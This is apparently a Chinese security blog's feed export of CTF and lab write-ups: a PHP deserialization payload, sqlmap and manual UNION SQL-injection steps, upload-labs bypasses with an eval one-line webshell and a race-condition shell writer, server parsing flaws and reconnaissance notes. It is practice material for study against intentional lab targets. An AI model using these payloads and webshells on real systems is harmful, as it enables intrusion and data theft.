src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Nmap/nmap2.jpg" alt=""><br>成功写入，蚁剑连接一下，在根目录找到flag</p>
<h3 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h3><p>查看源码，发现time.php?source<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/ReadlezPHP/ReadlezPHP0.jpg" alt=""><br>访问time.php?source<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$a</span>;</span><br><span class="line">    public <span class="variable">$b</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;a = <span class="string">"Y-m-d h:i:s"</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;b = <span class="string">"date"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="variable">$this</span>-&gt;b;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = new HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'source'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="variable">$ppp</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">"data"</span>]);</span><br></pre></td></tr></table></figure><br>反序列化，在__destruct中可以看到，$b($a)，即$b作为函数名，$a作为函数的参数，那这里就可构造代码执行，先看一下phpinfo()<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$a</span>;</span><br><span class="line">    public <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = new HelloPhp();</span><br><span class="line"><span class="variable">$c</span>-&gt;a=<span class="string">'phpinfo()'</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;b=<span class="string">"assert"</span>;</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure><br>Payload:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?data=O:8:<span class="string">"HelloPhp"</span>:2:&#123;s:1:<span class="string">"a"</span>;s:9:<span class="string">"phpinfo()"</span>;s:1:<span class="string">"b"</span>;s:6:<span class="string">"assert"</span>;&#125;</span><br></pre></td></tr></table></figure><br>在phpinfo()中发现flag<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/ReadlezPHP/ReadlezPHP1.jpg" alt=""></p>
]]></content>
      <categories>
        <category>CTF-Web-WriteUp</category>
      </categories>
  </entry>
  <entry>
    <title>Sqli-labs</title>
    <url>/post/31b2abaa.html</url>
    <content><![CDATA[<p>Sqlmap(kali linux)初步使用+手工注</p>
<h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p><img src="http://q63cs67co.bkt.clouddn.com/less1_1.PNG" alt=""><br>加单引号测试<br><img src="http://q63cs67co.bkt.clouddn.com/less1_2.PNG" alt=""><br>报错了，说明这里有注入点，上Sqlmap<br>爆数据库名<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://f0ea4202-4b3b-4ac1-8746-09cb20417283.node3.buuoj.cn/Less-1/?id=1"</span> --dbs</span><br></pre></td></tr></table></figure><br><img src="http://q63cs67co.bkt.clouddn.com/less1_3.PNG" alt=""><br>爆出数据库名，在security数据库中，接下来根据数据库名爆表名<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://f0ea4202-4b3b-4ac1-8746-09cb20417283.node3.buuoj.cn/Less-1/?id=1"</span> -D security --tables</span><br></pre></td></tr></table></figure><br><img src="http://q63cs67co.bkt.clouddn.com/less1_4.PNG" alt=""><br>爆出表名users,根据表名爆出字段<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://f0ea4202-4b3b-4ac1-8746-09cb20417283.node3.buuoj.cn/Less-1/?id=1"</span> -D security -T users --columns</span><br></pre></td></tr></table></figure><br><img src="http://q63cs67co.bkt.clouddn.com/less1_5.PNG" alt=""><br>爆出字段名后，即可爆出字段值<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://f0ea4202-4b3b-4ac1-8746-09cb20417283.node3.buuoj.cn/Less-1/?id=1"</span> -D security -T users -C <span class="string">"id,password,username"</span> --dump</span><br></pre></td></tr></table></figure><br><img src="http://q63cs67co.bkt.clouddn.com/less1_6.PNG" alt=""></p>
<h3 id="手工注"><a href="#手工注" class="headerlink" title="手工注"></a>手工注</h3><p><img src="http://q63cs67co.bkt.clouddn.com/less1_8.jpg" alt=""><br>没有问题<br><img src="http://q63cs67co.bkt.clouddn.com/less1_7.jpg" alt=""><br>报错，说明是单引号注入</p>
<h2 id="Less2"><a href="#Less2" class="headerlink" title="Less2"></a>Less2</h2>]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>SQL注入前导</title>
    <url>/post/d18eb395.html</url>
    <content><![CDATA[<h2 id="MySql数据库"><a href="#MySql数据库" class="headerlink" title="MySql数据库"></a>MySql数据库</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">查询当前所有的数据库：show databases;</span><br><span class="line">创建一个新的数据库：create database DBName;</span><br><span class="line">选择DBName数据库：use DBName;</span><br><span class="line">进入DBName数据库后，查询该数据库中的所有表：show tables;</span><br><span class="line">显示users表的结构：describe users;    或者    show columns from users;</span><br><span class="line">单行注释有<span class="comment">#和--,在实际的操作中#一般用%23来代替，--用--+来代替。因为在URL中，如果在最后加上--，那么浏览器在发送请求的时候会把URL末尾的空格舍去，而用--+代替--，原因是+在URL被URL编码后会变成空格。</span></span><br><span class="line">group_concat() 字符串连接</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql数据库默认有一张名为：information_schema的数据库，主要查schema表和tables表，schema表是用来存储该用户创建的所有数据库的库名，tables是用来存储用户创建所有数据的库名和表名，字段分别为table_schema和table_name</span><br><span class="line">SCHEMA_NAME 表示数据库名称 </span><br><span class="line">table_schema 表示表所属的数据库名称</span><br><span class="line">table_name 表示表的名称</span><br></pre></td></tr></table></figure>
<p>判断注入点：单引号，双引号，and 1=1，and 1=2<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">爆所有数据库名 </span><br><span class="line">(select group_concat(SCHEMA_NAME) from information_schema.schemata)</span><br></pre></td></tr></table></figure><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">爆当前库的所有表 </span><br><span class="line">select group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=database()</span><br></pre></td></tr></table></figure><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">得到表中的字段名 将敏感的表进行16进制编码tablename=0x7461626C656E616D65 </span><br><span class="line">select group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_name=0x7461626C656E616D65</span><br></pre></td></tr></table></figure><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">得到字段具体的值 </span><br><span class="line">select group_concat(id,fl4g) from secret_table</span><br><span class="line">select group_concat(id,username,password) from users--+</span><br></pre></td></tr></table></figure></p>
<h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.确定注入点后 order by 1 ，返回正常数字1换2，一次向上加，加到页面报错。</span><br><span class="line">2.如果order by 6错误，order by 5正常，即可确定字段数为5</span><br><span class="line">3.查看回显点 and 1=2 union select 1,2,3,4,5 在出现数字的位置进行查数据，如页面出现数字2</span><br><span class="line">4.查数据库名字：and 1=2 union select 1,database(),3,4,5 出现数字2的位置会出现数据库名字</span><br><span class="line">5.查表 and 1=2 union select 1,group_concat(table_name),3,4,5 from information_schema.tables <span class="built_in">where</span> table_schema=‘数据库名称’</span><br><span class="line">6.查列 and 1=2 union select 1,group_concat(column_name),3,4,5 from information_schema.columns <span class="built_in">where</span> table_name=‘表名’</span><br><span class="line">7.查内容 and 1=2 union select 1,group_concat(username,password) from admin</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>Perl网页文件+ARGV上传任意文件读取</title>
    <url>/post/6f3bf8d9.html</url>
    <content><![CDATA[<p><img src="http://q63cs67co.bkt.clouddn.com/Perl_ARGV.jpg" alt="Perl_ARGV"><br>上传一个11.php文件,内容为<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>用burpsuite抓包<br><img src="http://q63cs67co.bkt.clouddn.com/bp.PNG" alt=""><br>将上传的文件类型及文件内容处复制再粘贴一行，将filename去掉，然后内容填入ARGV<br><img src="http://q63cs67co.bkt.clouddn.com/bp2.PNG" alt=""><br><img src="http://q63cs67co.bkt.clouddn.com/bp3.PNG" alt=""></p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>Upload-Labs</title>
    <url>/post/a65e0b2c.html</url>
    <content><![CDATA[<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/upload-labs/upload.jpg" alt=""></p>
<h2 id="Pass-01-js前端验证"><a href="#Pass-01-js前端验证" class="headerlink" title="Pass-01(js前端验证)"></a>Pass-01(js前端验证)</h2><p>上传zx.php文件，弹出一个弹框<br>弹框说明是通过前端js代码来判断文件类型的<br>禁用js,或者控制台执行以下命令<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">checkFile</span></span>()&#123;&#125;</span><br></pre></td></tr></table></figure><br>这样就将本身的检测函数覆盖掉了,直接上传即可</p>
<h2 id="Pass-02-MIME类型验证"><a href="#Pass-02-MIME类型验证" class="headerlink" title="Pass-02(MIME类型验证)"></a>Pass-02(MIME类型验证)</h2><p>上传zx.php文件，显示 文件类型不正确，请重新上传！<br>用burp抓包<br>改包   Content-Type: image/gif<br>放包即可</p>
<h2 id="Pass-03-扩展名验证"><a href="#Pass-03-扩展名验证" class="headerlink" title="Pass-03(扩展名验证)"></a>Pass-03(扩展名验证)</h2><p>修改后缀名为.phtml即可</p>
<h2 id="Pass-04-htaccess文件解析漏洞"><a href="#Pass-04-htaccess文件解析漏洞" class="headerlink" title="Pass-04(.htaccess文件解析漏洞)"></a>Pass-04(.htaccess文件解析漏洞)</h2><p>发现没有过滤.htaccess文件<br>文件解析规则绕过<br>上传一个.htaccess文件<br>文件内容为：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><br>这样所有文件都会被解析成php<br>制作一个图片马，上传即可，这样文件就会被解析为php文件<br>图片马制作过程如下：<br>一张普通照片1.jpg<br>一个写有一句话木马的2.php文件，内容为<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">"pass"</span>]); <span class="built_in">echo</span> <span class="string">"success"</span>?&gt;</span><br></pre></td></tr></table></figure><br>命令提示符下执行以下命令：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">copy 1.jpg/b+2.php/a upload.jpg</span><br></pre></td></tr></table></figure><br>其中b是指二进制，a是指ASCII,upload.jpg就是最后生成的图片马</p>
<h2 id="Pass-05-扩展名大写绕过"><a href="#Pass-05-扩展名大写绕过" class="headerlink" title="Pass-05(扩展名大写绕过)"></a>Pass-05(扩展名大写绕过)</h2><p>源码中发现没有将文件后缀名大小写统一处理，即后缀名大小写绕过<br>上传upload.PHP即可<br>常见扩展名绕过：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">asp:asa,cer,cdx</span><br><span class="line">aspx:ashx,asmx,ascx</span><br><span class="line">php:php2、php3、php4、php5、phps、phtml</span><br><span class="line">jsp:jspx,jspf</span><br></pre></td></tr></table></figure></p>
<h2 id="Pass-06-扩展名末尾空格绕过"><a href="#Pass-06-扩展名末尾空格绕过" class="headerlink" title="Pass-06(扩展名末尾空格绕过)"></a>Pass-06(扩展名末尾空格绕过)</h2><p>源码中发现没有对文件后缀名进行去空处理，可在后缀名后加入空格绕过<br>burpsuite抓包，修改文件名为’11.php ‘</p>
<h2 id="Pass-07-扩展名末尾加-绕过"><a href="#Pass-07-扩展名末尾加-绕过" class="headerlink" title="Pass-07(扩展名末尾加.绕过)"></a>Pass-07(扩展名末尾加.绕过)</h2><p>源码中发现没有对文件后缀名末尾进行去’.’处理，利用windows特性，会自动去掉后缀名中最后的’.’,可在后缀名后加上’.’来绕过,即upload.php.</p>
<h2 id="Pass-08-扩展名末尾加-DATA绕过"><a href="#Pass-08-扩展名末尾加-DATA绕过" class="headerlink" title="Pass-08(扩展名末尾加::$DATA绕过)"></a>Pass-08(扩展名末尾加::$DATA绕过)</h2><p>源码中发现没有对文件后缀名进行去’::$DATA’处理，可在后缀名后加上’::$DATA’来绕过，即上传upload.php::$DATA。但是没法getshell,原因是这个靶机是linux系统，而这是windows特性，且必须是php,必须是那个源文件。php在windows的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理，不会检测后缀名，且保持”::$DATA”之前的文件名，他的目的就在于不检查后缀名</p>
<h2 id="Pass-09-文件路径可控-空格-绕过"><a href="#Pass-09-文件路径可控-空格-绕过" class="headerlink" title="Pass-09(文件路径可控.空格.绕过)"></a>Pass-09(文件路径可控.空格.绕过)</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">'/'</span>.<span class="variable">$file_name</span>;</span><br></pre></td></tr></table></figure>
<p>上传文件路径是通过拼接处理的，即可构造11.php.空格.,然后末尾的点又被除去,该文件被处理后会变成11.php.,这样就可绕过了</p>
<h2 id="Pass-10-针对str-ireplace函数双写后缀绕过"><a href="#Pass-10-针对str-ireplace函数双写后缀绕过" class="headerlink" title="Pass-10(针对str_ireplace函数双写后缀绕过)"></a>Pass-10(针对str_ireplace函数双写后缀绕过)</h2><p>上传文件的后缀名若在黑名单中，则会被替换为空，那么就可以通过双写来绕过，即上传11.pphphp</p>
<h2 id="Pass-11-get方式路径可控-00截断"><a href="#Pass-11-get方式路径可控-00截断" class="headerlink" title="Pass-11(get方式路径可控%00截断)"></a>Pass-11(get方式路径可控%00截断)</h2><p>%00对PHP版本有要求<br>0、php版本必须小于5.3.4<br>1、magic_quotes_gpc必须为Off<br>而这个靶机php版本为7.2.21,所以利用失败了</p>
<h2 id="Pass-12-post方式路径可控-00截断"><a href="#Pass-12-post方式路径可控-00截断" class="headerlink" title="Pass-12(post方式路径可控%00截断)"></a>Pass-12(post方式路径可控%00截断)</h2><p>同Pass-11</p>
<h2 id="Pass-13-校验文件头，图片马-文件包含漏洞"><a href="#Pass-13-校验文件头，图片马-文件包含漏洞" class="headerlink" title="Pass-13(校验文件头，图片马+文件包含漏洞)"></a>Pass-13(校验文件头，图片马+文件包含漏洞)</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$bin</span> = fread(<span class="variable">$file</span>, 2); //只读2字节</span><br></pre></td></tr></table></figure>
<p>发现只对文件的头2个字节做检测,可以利用图片马<br>先将图片马上传<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/upload-labs/upload_pass13_0.jpg" alt=""><br>然后点击文件包含漏洞<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/*</span><br><span class="line">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span><br><span class="line">*/</span><br><span class="line">header(<span class="string">"Content-Type:text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$file</span>))&#123;</span><br><span class="line">    include <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(__file__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>利用文件包含漏洞来包含刚上传的图片马<br>payload:?file=?file=upload/8820200706111144.png<br>成功getshell了<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/upload-labs/upload_pass13_1.jpg" alt=""></p>
<h2 id="Pass-14-getimagesize绕过，图片马-文件包含漏洞"><a href="#Pass-14-getimagesize绕过，图片马-文件包含漏洞" class="headerlink" title="Pass-14(getimagesize绕过，图片马+文件包含漏洞)"></a>Pass-14(getimagesize绕过，图片马+文件包含漏洞)</h2><p>getimagesize获取文件类型，还是直接就可以利用图片马就可进行绕过<br>方法同Pass-13</p>
<h2 id="Pass-15-exif-imagetype绕过，图片马-文件包含漏洞"><a href="#Pass-15-exif-imagetype绕过，图片马-文件包含漏洞" class="headerlink" title="Pass-15(exif_imagetype绕过，图片马+文件包含漏洞)"></a>Pass-15(exif_imagetype绕过，图片马+文件包含漏洞)</h2><p>exif_imagetype — 判断一个图像的类型<br>同Pass-14</p>
<h2 id="Pass-16-二次渲染"><a href="#Pass-16-二次渲染" class="headerlink" title="Pass-16(二次渲染)"></a>Pass-16(二次渲染)</h2><p>imagecreatefrom 系列函数用于从文件或 URL 载入一幅图像，成功返回图像资源，失败则返回一个空字符串。<br>该系列函数有：<br>imagecreatefromgif()：创建一块画布，并从 GIF 文件或 URL 地址载入一副图像<br>imagecreatefromjpeg()：创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像<br>imagecreatefrompng()：创建一块画布，并从 PNG 文件或 URL 地址载入一副图像<br>imagecreatefromwbmp()：创建一块画布，并从 WBMP 文件或 URL 地址载入一副图像<br>imagecreatefromstring()：创建一块画布，并从字符串中的图像流新建一副图像<br>上传图片马，但是并不能getshell,将上传的图片马下载下来，用16进制编辑器打开，可以发现里面的一句话木马被去除了。所以需要在图片中找到没被改变的部分，将一句话木马放在这里，再次上传就可getshell了</p>
<h2 id="Pass-17-unlink-条件竞争"><a href="#Pass-17-unlink-条件竞争" class="headerlink" title="Pass-17(unlink,条件竞争)"></a>Pass-17(unlink,条件竞争)</h2><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/upload-labs/upload_pass17_0.jpg" alt=""><br>如果上传符合后缀的文件，会被rename函数重命名，那样就无法拿到文件的路径了<br>如果直接上传包含一句话木马的php文件，但是当代码会检测到上传的是php文件时，就会执行unlink删除该文件，那么我们可以通过条件竞争的方式在unlink之前getshell,为了一直能getshell，可以在上传的write.php文件中写入以下代码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="variable">$myfile</span>=fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>) or die(<span class="string">"error"</span>);</span><br><span class="line"><span class="variable">$shell</span>=<span class="string">'&lt;?php @eval($_POST["pass"]); echo "success"?&gt;'</span>;</span><br><span class="line">fwrite(<span class="variable">$myfile</span>,<span class="variable">$shell</span>);</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>在unlink之前执行write.php就可以在同一目录下产生一个shell.php，我们就可以通过shell.php来getshell了<br>为了增大write.php被执行的概率，这里使用burp中的intruder模块，在其中add一个变量$a$，用于intruder模块不断发包，burp开始攻击后，在浏览器不断访问write.php文件，攻击结束后访问shell.php<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/upload-labs/upload_pass17_1.jpg" alt=""><br>成功getshell</p>
<h2 id="Pass-18-rename-条件竞争"><a href="#Pass-18-rename-条件竞争" class="headerlink" title="Pass-18(rename,条件竞争)"></a>Pass-18(rename,条件竞争)</h2><p>对上传文件后缀名进行判断，检查了文件大小，文件是否已经存在等。如果文件能够上传成功，会对文件重命名<br>这里就产生了条件竞争漏洞，只要赶在rename执行之前getshell就可</p>
<h2 id="服务器解析漏洞"><a href="#服务器解析漏洞" class="headerlink" title="服务器解析漏洞"></a>服务器解析漏洞</h2><h3 id="IIS-IIS6-0"><a href="#IIS-IIS6-0" class="headerlink" title="IIS(IIS6.0)"></a>IIS(IIS6.0)</h3><p>Windows server 2003广泛存在该漏洞<br>目录解析漏洞：形如1.asp/2.jpg<br>这里的1.asp是文件夹名，2.jpg是文件名<br>文件解析漏洞：形如1.asp;.jpg<br>IIS会把这里的jpg文件解析为asp文件</p>
<h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><p>形如1.jpg/2.php<br>这里的2.php并不存在，就会将1.jpg文件解析为php文件</p>
<h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><p>形如1.php.xxx<br>这里的xxx是指Apache不可识别的扩展名，例如1.php.rar<br>对于Apache低版本来说，扩展名是从右向左识别的，当遇到不可识别的扩展名时，它会跳过，继续向左寻找可识别的扩展名，例如这里的1.php.rar,由于rar对于Apache来说是不可识别的，就会向左继续寻找，发现php可以识别那么1.php.rar就会被识别为php文件</p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>Linux系统中安装LANMP</title>
    <url>/post/242d0b88.html</url>
    <content><![CDATA[<p>LANMP是Linux下Apache、Nginx、MySQL和PHP的应用环境，本文章使用的是WDLinux的一款集成的安装包</p>
<h3 id="下载安装包"><a href="#下载安装包" class="headerlink" title="下载安装包"></a>下载安装包</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://dl.wdlinux.cn/files/lanmp_v3.tar.gz</span><br></pre></td></tr></table></figure>
<p><img src="http://q63cs67co.bkt.clouddn.com/lanmp_install.PNG" alt=""></p>
<h3 id="解压文件"><a href="#解压文件" class="headerlink" title="解压文件"></a>解压文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar zxvf lanmp_v3.tar.gz</span><br></pre></td></tr></table></figure>
<p><img src="http://q63cs67co.bkt.clouddn.com/lanmp_install.PNG" alt=""></p>
<h3 id="安装LANMP"><a href="#安装LANMP" class="headerlink" title="安装LANMP"></a>安装LANMP</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh lanmp.sh</span><br></pre></td></tr></table></figure>
<p>在Kali和Ubantu系统中，输入该命令会报错<br><img src="http://q63cs67co.bkt.clouddn.com/error.PNG" alt=""><br>这是因为系统的dash兼容性不好，而编译常用的就是bash,可通过以下命令修改系统的编辑器(Shell)操作<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo dpkg-reconfigure dash</span><br></pre></td></tr></table></figure><br><img src="http://q63cs67co.bkt.clouddn.com/shell.PNG" alt=""><br>然后选择&lt;否&gt;<br><img src="http://q63cs67co.bkt.clouddn.com/shell_sure.PNG" alt=""><br>这时会有五个选项<br>选项一：安装Apache、PHP、MySQL、Zend、PureFTPd和phpMyAdmin服务<br>选项二：安装Nginx、PHP、MySQL、Zend、PureFTPd和phpMyAdmin服务<br>选项三：安装Nginx、Apache、PHP、MySQL、Zend、PureFTPd和phpMtAdmin服务<br>选项四：安装所有服务<br>选项五：现在不安装<br><img src="http://q63cs67co.bkt.clouddn.com/choose.PNG" alt=""><br>然后就报错了，网上找了半天也没找到，先这样吧，等问问大佬先<br>安装成功后在浏览器访问IP和8080端口，输入默认账号admin和密码wdlinux.cn</p>
]]></content>
      <categories>
        <category>Web安全攻防-渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title>信息收集</title>
    <url>/post/312e3d12.html</url>
    <content><![CDATA[<h2 id="收集域名信息"><a href="#收集域名信息" class="headerlink" title="收集域名信息"></a>收集域名信息</h2><h3 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h3><p>kali下的whois查询<br><img src="http://q63cs67co.bkt.clouddn.com/whois.jpg" alt=""><br>爱站工具网：<a href="https://whois.aizhan.com" target="_blank" rel="noopener">https://whois.aizhan.com</a><br>站长之家：<a href="http://whois.chinaz.com" target="_blank" rel="noopener">http://whois.chinaz.com</a><br>VirusTotal：<a href="https://www.virustotal.com" target="_blank" rel="noopener">https://www.virustotal.com</a></p>
<h3 id="备案信息查询"><a href="#备案信息查询" class="headerlink" title="备案信息查询"></a>备案信息查询</h3><p>ICP备案信息查询网：<a href="http://www.beianbeian.com" target="_blank" rel="noopener">http://www.beianbeian.com</a><br>天眼查：<a href="http://www.tianyancha.com" target="_blank" rel="noopener">http://www.tianyancha.com</a></p>
<h2 id="收集敏感信息"><a href="#收集敏感信息" class="headerlink" title="收集敏感信息"></a>收集敏感信息</h2><h3 id="搜索引擎-google-关键字语法搜索"><a href="#搜索引擎-google-关键字语法搜索" class="headerlink" title="搜索引擎(google)关键字语法搜索"></a>搜索引擎(google)关键字语法搜索</h3><h3 id="Burpsuite"><a href="#Burpsuite" class="headerlink" title="Burpsuite"></a>Burpsuite</h3><p>利用Burpsuite的Repeater获取对象服务器信息，如运行的Server类型及版本，PHP版本信息。针对不同的Server，可以利用不同的漏洞进行测试</p>
<h2 id="收集子域名信息"><a href="#收集子域名信息" class="headerlink" title="收集子域名信息"></a>收集子域名信息</h2><h3 id="子域名检测工具"><a href="#子域名检测工具" class="headerlink" title="子域名检测工具"></a>子域名检测工具</h3><p>Layer子域名挖掘机:<a href="https://www.uedbox.com/post/8998/" target="_blank" rel="noopener">https://www.uedbox.com/post/8998/</a><br>Sublist3r,subDomainsBrute</p>
<h3 id="搜索引擎枚举"><a href="#搜索引擎枚举" class="headerlink" title="搜索引擎枚举"></a>搜索引擎枚举</h3><p>例如要搜索百度旗下的子域名：site:baidu.com</p>
<h3 id="第三方聚合应用枚举"><a href="#第三方聚合应用枚举" class="headerlink" title="第三方聚合应用枚举"></a>第三方聚合应用枚举</h3><p>DNSSdumpster网站：<a href="https://dnsdumpster.com/" target="_blank" rel="noopener">https://dnsdumpster.com/</a></p>
<h3 id="证书透明度公开日志枚举"><a href="#证书透明度公开日志枚举" class="headerlink" title="证书透明度公开日志枚举"></a>证书透明度公开日志枚举</h3><p>crt.sh:<a href="https://crt.sh" target="_blank" rel="noopener">https://crt.sh</a><br>censys:<a href="https://censys.io" target="_blank" rel="noopener">https://censys.io</a><br>子域名爆破网站:<a href="https://phpinfo.me/domain" target="_blank" rel="noopener">https://phpinfo.me/domain</a><br>IP反查绑定域名网站:<a href="http://dns.aizhan.com" target="_blank" rel="noopener">http://dns.aizhan.com</a></p>
<h2 id="收集常用端口信息"><a href="#收集常用端口信息" class="headerlink" title="收集常用端口信息"></a>收集常用端口信息</h2><p>扫描工具：Nmap<br>无状态端口扫描工具：Masscan,ZMap<br>御剑高速TCP端口扫描工具</p>
<h3 id="文件共享服务端口"><a href="#文件共享服务端口" class="headerlink" title="文件共享服务端口"></a>文件共享服务端口</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">端口号                  端口说明                    攻击方向</span><br><span class="line">21/22/69            Ftp/Tftp文件传输协议      允许匿名的上传、下载、爆破和嗅探操作</span><br><span class="line">2049                    Nfs服务                     配置不当</span><br><span class="line">139                     Samba服务            爆破、未授权访问、远程代码执行</span><br><span class="line">389                 Ldap目录访问协议           注入、允许匿名访问、弱口令</span><br></pre></td></tr></table></figure>
<h3 id="远程连接服务端口"><a href="#远程连接服务端口" class="headerlink" title="远程连接服务端口"></a>远程连接服务端口</h3> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">端口号                  端口说明                    攻击方向</span><br><span class="line"> 22                   SSH远程连接            爆破、 SSH隧道及内网代理转发、文件传输</span><br><span class="line"> 23                   Telnet远程连接             爆破、嗅探、弱口令</span><br><span class="line"> 3389                 Rdp远程桌面连接        Shift后门(需要Windows Server 2003以下的系统)、爆破</span><br><span class="line"> 5900                    VNC                       弱口令爆破 </span><br><span class="line"> 5632                PyAnywhere服务               抓密码、代码执行</span><br></pre></td></tr></table></figure>
<h3 id="Web应用服务端口"><a href="#Web应用服务端口" class="headerlink" title="Web应用服务端口"></a>Web应用服务端口</h3> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">端口号                  端口说明                    攻击方向</span><br><span class="line">80/443/8080         常见的Web服务端口       Web攻击、爆破、对应服务器版本漏洞</span><br><span class="line">7001/7002           WebLogin控制台          Java反序列化、弱口令</span><br><span class="line">8080/8089     JBoss/Resin/Jetty/Jenkins     反序列化、控制台弱口令</span><br><span class="line">9090                WebSphere控制台         Java反序列化、弱口令</span><br><span class="line">4848                GlassFish控制台                 弱口令</span><br><span class="line">1352              Lotus domino邮件服务      弱口令、信息泄露、爆破</span><br><span class="line">10000             Webmin-Web控制面板                弱口令</span><br></pre></td></tr></table></figure>
